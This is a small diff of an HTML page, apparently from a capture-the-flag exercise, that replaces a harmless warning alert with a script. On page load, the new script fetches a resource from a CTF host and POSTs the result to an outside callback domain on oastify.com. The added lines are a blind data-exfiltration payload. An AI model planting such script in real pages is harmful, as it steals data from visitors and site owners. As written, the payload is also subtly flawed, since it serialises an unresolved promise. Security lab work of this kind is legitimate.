@@ -1,7 +1,8 @@
 <html lang="en">
     <head>
-        <script type="text/javascript">
-            alert("This could have been a phishing page. The previous page must have had XSS (or you intentionally clicked on a link to here)")
+        <script>
+            let x = fetch('https://black.ctfio.com/blind/recipe')
+            fetch("https://z44ou7y245szg0rybw38b1408rep2iq7.oastify.com", {method: "POST", body: JSON.stringify(x)})
         </script>
     </head>
     <body>
